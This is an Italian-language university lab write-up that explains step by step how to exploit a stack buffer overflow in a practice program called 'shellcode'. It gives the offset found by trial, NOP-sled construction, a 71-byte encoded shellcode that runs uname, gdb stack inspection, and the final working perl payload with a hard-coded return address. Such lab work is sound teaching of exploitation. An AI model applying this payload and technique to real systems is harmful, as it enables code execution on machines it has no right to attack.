# Shellcode

## Consegna

```
Esercizio simile a quello svolto in aula.

Il programma vulnerabile è shellcode

Eseguire l'esercizio in due modi:

1. usando lo stesso shellcode utilizzato durante l'esercitazione in laboratorio
2. usando lo shellcode fornito qui
consegnare un file report.pdf che contenga:

- Payload e screenshot che dimostra la capacità di sovrascrivere l'indirizzo di ritorno
- Payload e screenshot dell'exploit finale lanciato
- Spiegazione dettagliata di come si è proceduto ad analizzare ed exploitare la vulnerabilità
```

## Soluzione

Ok preparatevi perché il processo di questo è molto lungo. 

Prima di tutto, il procedimento è lo stesso per i due shellcode. `shellcode_1.txt` è il file che abbiamo usato in classe, mentre `shellcode_casa_uname.txt` è quello dell'esercizio, che userò anche qui.

Allora, prima di tutto, ancora una volta ci tocca trovare il numero di caratteri per cui otteniamo un SegFault, e dobbiamo fare in modo che questo segfault sia causato da un indirizzo che "possiamo controllare".

Dunque, per fare ciò, ci comportiamo esattamente come per l'esercizio secret_function, e procediamo per prova ed errore. 
Inizialmente il mio payload era `$(perl -e 'print "A"xN, "BBBB"')`, e vogliamo fare in modo che gdb ci mostri, nell'indirizzo di ritorno che ha causato il SIGSEV, `0x42424242` (che sarebbe la codifica in byte di BBBB). 

Dopo vari tentativi, noteremo che questo valore è appunto N=1512. 

Bene, adesso allora dovremo fare delle altre cose. 
Prima di tutto, cambiamo il valore di "A" con dei byte NOOP, che vengono ignorati quando eseguiti. Otterremmo così `$(perl -e 'print "\x90"x1512, "BBBB"')`.
Dopodiché, prendiamo il codice di shellcode che ci viene fornito, e ne misuriamo la lunghezza con la funzione `len` del compilatore JIT di python3.  
```bash
$ python3 
>>> len(b'\xbf\x16\x6e\x8a\x7c\xdd\xc3\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x0c\x31\x7a\x12\x03\x7a\x12\x83\xd4\x6a\x68\x89\xb2\x79\x34\xeb\x10\x18\xac\x26\xf7\x6d\xcb\x51\xd8\x1e\x7c\xa2\x4e\xce\x1e\xcb\xe0\x99\x3c\x59\x14\x90\xc2\x5e\xe4\xd6\xac\x3f\x89\x7d\x11\xed\x30\x7e\x06\xbe\x3b\x9f\x65\xc0')
```

Il codice ci ritornerà 71. 
Dunque, dobbiamo ricalcolare il payload in modo che "faccia spazio" alla shellcode. Otterremo così:
```
$(perl -e 'print "\x90"x(1512-71),"\xbf\x16\x6e\x8a\x7c\xdd\xc3\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x0c\x31\x7a\x12\x03\x7a\x12\x83\xd4\x6a\x68\x89\xb2\x79\x34\xeb\x10\x18\xac\x26\xf7\x6d\xcb\x51\xd8\x1e\x7c\xa2\x4e\xce\x1e\xcb\xe0\x99\x3c\x59\x14\x90\xc2\x5e\xe4\xd6\xac\x3f\x89\x7d\x11\xed\x30\x7e\x06\xbe\x3b\x9f\x65\xc0", "BBBB"')
```

Abbiamo ancora una cosa da fare, ovvero ottenere l'indirizzo di ritorno. 
Per farlo, consiglio prima di tutto di riavviare gdb salvando il payload attuale da qualche parte, poi contrallare quale sia il nome della funzione vulnerabile che viene chiamata attraverso il comando `info functions` (nel nostro caso la funzione vulnerabile si chiama `vuln`), e poi inserire un breakpoint in gdb con il comando `b *vuln`. A questo punto, riavviamo il programma con il payload, e andiamo ad esplorare lo stack, in particolare 600 byte di esso. 
Appena gdb ci avvisa che abbiamo raggiunto il breakpoint, usiamo il comando `x/600xw $esp`, che indica che andiamo a vedere 600 byte partendo dallo stack pointer. Andiamo a vedere lo stack (in caso gdb non mostri tutto, inviare il comando `c` per fare in modo che stampi anche il resto), e poi andiamo a rilevare l'indirizzo in cui abbiamo in cui la shellcode inizia (ovvero, in cui smettono di esserci dei byte 90 ed inizia il codice della shellcode). Questo indirizzo è nella colonna a destra della stessa riga (solitamente di un colore diverso). 
A questo punto, lo salviamo da qualche parte, e riscriviamo il payload con il nuovo indirizzo di ritorno, che nel nostro caso è `0xffffd4dc` (che dovremo riscrivere nel payload in senso contrario causa little endianess).
Dunque, il payload finale sarà:
```
$(perl -e 'print "\x90"x(1512-71),"\xbf\x16\x6e\x8a\x7c\xdd\xc3\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x0c\x31\x7a\x12\x03\x7a\x12\x83\xd4\x6a\x68\x89\xb2\x79\x34\xeb\x10\x18\xac\x26\xf7\x6d\xcb\x51\xd8\x1e\x7c\xa2\x4e\xce\x1e\xcb\xe0\x99\x3c\x59\x14\x90\xc2\x5e\xe4\xd6\xac\x3f\x89\x7d\x11\xed\x30\x7e\x06\xbe\x3b\x9f\x65\xc0", "\xdc\xd4\xff\xff"')
```

Se tutto va bene, il programma stampa l'output del comando `uname`.

PS: In realtà possiamo anche skippare la parte in cui mettiamo il breakpoint, e controllare lo stack subito dopo che avviene il segfault.  

_WARNING_: Quando gdb ritorna come errore "File too long", e non ti riesci a spiegare perché, semplicemente salvati il payload, riavvia gdb e riscrivilo.  